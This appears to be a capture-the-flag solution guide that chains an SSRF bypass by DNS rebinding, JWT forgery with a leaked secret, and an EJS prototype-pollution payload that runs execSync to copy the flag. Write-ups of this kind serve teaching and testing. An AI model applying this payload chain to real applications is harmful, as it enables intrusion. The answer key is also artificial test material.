
# Solution Guide v3 (Insane)

1.  **Recon**:
    *   Check `/robots.txt`. Finds `/internal/debug/source` and `/api/settings`.
    *   Footer says "Designed and developed by tintin". Username hint: `tintin`.

2.  **SSRF Bypass (DNS Rebinding)**:
    *   `/api/preview` validates IP by resolving DNS *before* fetching.
    *   Attack: Use a DNS Rebinding service (e.g., `rbndr.us` or custom).
    *   Set domain to resolve to `8.8.8.8` (valid) then `127.0.0.1` (blocked but passed check) with short TTL.
    *   Target: `http://<rebinding-domain>:3000/internal/debug/source`.
    *   Result: Leak source code.

3.  **JWT Forgery**:
    *   Source reveals `HMAC_SECRET = 'Curs3d_S3cr3t_K3y_F0r_JWT_S1gn1ng_777'`.
    *   Forge a token: `{"username":"tintin","role":"user"}` (or whatever role isn't guest, code just checks `!= guest`).
    *   Set cookie `auth_token=<forged_jwt>`.

4.  **Prototype Pollution**:
    *   Access `/dashboard` (renders `admin.ejs`).
    *   Source/HTML comments hint at `/api/settings` accepting JSON.
    *   Payload:
        ```json
        {
          "__proto__": {
            "outputFunctionName": "x;process.mainModule.require('child_process').execSync('cp /flag.txt public/f.txt');x"
          }
        }
        ```

5.  **RCE**:
    *   Refrest page. Payload executes.
    *   Get flag at `/f.txt`.
